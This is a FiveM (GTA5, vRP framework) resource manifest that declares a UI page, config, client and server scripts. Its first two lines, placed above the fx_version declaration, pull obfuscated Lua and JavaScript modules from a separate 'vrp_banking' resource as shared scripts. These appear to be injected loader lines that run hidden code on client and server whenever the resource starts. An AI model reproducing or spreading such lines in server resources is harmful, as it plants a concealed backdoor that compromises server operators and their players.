shared_script '@vrp_banking/ai_module_fg-obfuscated.lua'
shared_script '@vrp_banking/ai_module_fg-obfuscated.js'
fx_version 'cerulean'
game 'gta5'

ui_page 'nui/ui.html'

shared_script 'config.lua'

client_script {
  "@vrp/client/Proxy.lua",
	"@vrp/client/Tunnel.lua",
  'client/main.lua'
}

server_script {
  "@vrp/lib/utils.lua",
  'server/main.lua'
}

files {
  'nui/**'
}
